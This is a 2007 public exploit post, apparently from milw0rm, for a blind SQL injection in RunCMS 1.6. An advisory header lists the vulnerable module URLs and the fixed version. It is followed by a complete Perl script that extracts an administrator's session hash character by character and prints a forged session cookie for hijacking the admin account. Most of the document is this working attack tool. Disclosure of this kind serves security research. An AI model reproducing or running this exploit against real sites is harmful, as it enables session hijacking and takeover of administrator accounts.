#/******************************************************************/
#/**** RUNCMS 1.6 BLIND SQL Injection Exploit get Admin Cookie *****/
#/******************************************************************/
#/***********  exploit get admin cookie that can be used  *********/
#/***********  to login by pasting it into browser (Opera) *********/ 
#/***********  and then get access to Admin session        *********/
#/***********  and change Admins password                  *********/ 
#/***********                                              *********/ 
#/******************************************************************/
#/******************************************************************/
#/***********    tested on RUNCMS english version  1.6     *********/
#/******************************************************************/
#/******************************************************************/
#/* Date of Public EXPLOIT:  December 25, 2007                     */
#/* Written by:  Alexandr "Sh2kerr" Polyakov                       */
#/*              from [Digital Security Research Group]            */
#/*              research@dsec.ru                                  */
#/*                                                                */
#/* Original Advisory:                                             */
#/******************************************************************/
#/*                                                               **/
#/******************************************************************/
#
#  OSVDB: 41235, 41236, 41237, 41238, 41239, 41240
#
#
#         Details
#************************************************************************************
#
#
# Multiple Blind SQL Injection
#
# Attacker can inject SQL code in modules:
#
#       http://[server]/[installdir]/modules/mydownloads/brokenfile.php?lid+DSecRG_INJECTION
#       http://[server]/[installdir]/modules/mydownloads/visit.php?lid=2+DSecRG_INJECTION
#       http://[server]/[installdir]/modules/mydownloads/ratefile.php?lid=2+DSecRG_INJECTION
#       http://[server]/[installdir]/modules/mylinks/ratelink.php?lid=2+DSecRG_INJECTION
#       http://[server]/[installdir]/modules/mylinks/modlink.php?lid=2+DSecRG_INJECTION
#       http://[server]/[installdir]/modules/mylinks/brokenlink.php?lid=2+DSecRG_INJECTION
#
# Example:
#
# This query will return link to download file:
#       GET http://[server]/[installdir]/modules/mydownloads/brokenfile.php?lid=1+and+1=1 HTTP/1.0
#
#
# This query will return error:
#       GET http://[server]/[installdir]/modules/mydownloads/brokenfile.php?lid=1+and+1=0 HTTP/1.0
#
#
#
#    Fix Information
#*************************************************************************************
#
#RunCMS was altered to fix this flaw on Dec 15, 2007. Updated version (1.6.1) can be downloaded here:
#       http://www.runcms.org/modules/mydownloads/visit.php?lid=131
#
#
#
#    About
#*************************************************************************************
#
# Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration 
# testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. 
# Digital Security Research Group focuses on web application and database security problems with vulnerability reports, 
# advisories and whitepapers posted regularly on our website.
#
#
# Contact:      research@dsec.ru
#               http://www.dsec.ru (in Russian)
#
#
#
#
####################################################################################


















#!/usr/bin/perl


use LWP::UserAgent;

$path   = $ARGV[0]; 
$string = "this file must"; #  !!CHEAT!! this string must be changed if Runsms language is not English
$user_id = $ARGV[1];
if (@ARGV < 2) { &usage; }


$s_num =1;
$n=0;
$|++;
print "\r\n\r\n";

 print "************ RunCMS 1.6 Blind SQLInjection  Get Admin Cookie by Sh2kerr (DSecRG)****************\r\n";
 print "*****************************************************************************\r\n";
 

while(1)
{
&found(48,122);

if ($char=="0")
{
print "\r\n\r\n"; 

 ($res1,$res2,$res3)=split(":",$allchar);  # 
 $time = $res3+ 2678400;
 print "*****************************************************************************\r\n";
 print "      Username: $res1\r\n";
 print "   Cookie Hash: $res2\r\n";
 print "   Cookie Time: $res3\r\n\r\n"; 
 print "*****************************************************************************\r\n";
 print "       Place this string into your cookie parameter  (in Opera)              \r\n";
 print "       rc_sess=a:3:{i:0;i:$user_id;i:1;s:40:\"$res2\";i:2;i:$time;}          \r\n";
 print "*****************************************************************************\r\n";
 if ($allchar=="0" & $res1=="0") 
 {print "\r\n  ERROR: User not logged in , try another user_id \r\n"; }

#print " total requests: $n\r\n";
 exit(); 
 }
else 
 { print ":) ";  $allchar .= chr($char); 
 }

$s_num++;
}





sub found($$)
 {
 my $fmin = $_[0];
 my $fmax = $_[1];


 if (($fmax-$fmin)<5) { $char=&crack($fmin,$fmax); return $char } 
 
 $r = int($fmax - ($fmax-$fmin)/2);
 $check = ">$r";
 
 if ( &check($check) ) 
 { &found($r,$fmax);  }
 else {  &found($fmin,$r+1); }
 }



sub crack($$)
 {
 my $cmin = $_[0];
 my $cmax = $_[1];
 $i = $cmin;
 
 while ($i<$cmax)
  {
  $crcheck = "=$i";
  if ( &check($crcheck) ) { return $i;}
  $i++;
  }
 return;
 }



sub check($)
 {

 $n++;
 $ccheck = $_[0];

 $http_query = $path." AND ascii(substring((SELECT CONCAT(uname,CHAR(58),hash,CHAR(58),time) FROM runcms.runcms_session WHERE uid=".$user_id."),".$s_num.",1))".$ccheck;

 
 $mcb_reguest = LWP::UserAgent->new() or die;
 $res = $mcb_reguest->post($http_query); 

 @results = $res->content; 
 foreach $result(@results)
  {
  if ($result =~ /$string/) { return 1; }
  }
 return 0;
 }
 
sub usage
 {
 print "Usage: $0 [path_to_script?param] user_id \r\n";
 print "e.g. : $0 http://server/modules/mydownloads/visit.php?lid=3 1";
 exit(); 
 }

# milw0rm.com [2007-12-25]